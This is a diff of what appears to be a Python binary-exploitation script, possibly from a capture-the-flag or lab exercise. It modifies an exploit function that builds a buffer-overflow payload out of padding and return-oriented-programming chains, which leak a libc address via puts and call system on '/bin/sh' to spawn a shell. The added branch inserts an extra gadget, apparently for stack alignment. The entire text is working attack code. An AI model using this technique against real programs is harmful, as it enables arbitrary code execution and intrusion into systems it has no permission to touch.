@@ -74,14 +74,21 @@ def test():
     payload = b"".join(test)
     inject(payload, test_stage)
 
-def exploit():
-    rop_leak = p64(POP_RDI) + p64(bin_sh) + p64(PUTS_PLT)
-    rop_exec = p64(pop_rdi) + p64(bin_sh) + p64(system_libc)
-    exploit = [
-        b"A" * offset,
-        rop_leak,
-        rop_exec
-    ]
+def exploit(leak=True):
+    if leak:
+        rop_leak = p64(POP_RDI) + p64(bin_sh) + p64(PUTS_PLT)
+        rop_exec = p64(pop_rdi) + p64(bin_sh) + p64(system_libc)
+        exploit = [
+            b"A" * offset,
+            rop_leak,
+            rop_exec
+        ]
+    else:
+        rop_exec = p64(pop_rdi+1) + p64(pop_rdi) + p64(bin_sh) + p64(system_libc)
+        exploit = [
+            b"A" * offset,
+            rop_exec
+        ]
     payload = b"".join(exploit)
     inject(payload, exploit_stage)
 
